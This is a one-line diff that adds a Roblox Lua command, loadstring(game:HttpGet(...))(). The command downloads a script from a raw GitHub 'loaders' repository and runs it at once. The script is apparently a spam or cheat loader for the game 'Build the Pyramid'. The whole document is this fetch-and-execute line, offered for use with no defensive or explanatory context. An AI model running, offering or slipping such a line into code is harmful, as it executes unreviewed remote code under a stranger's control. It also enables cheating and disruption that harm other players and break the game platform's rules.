@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/build-the-pyramid-spam6-21yexd9ufasfjb.lua"))()
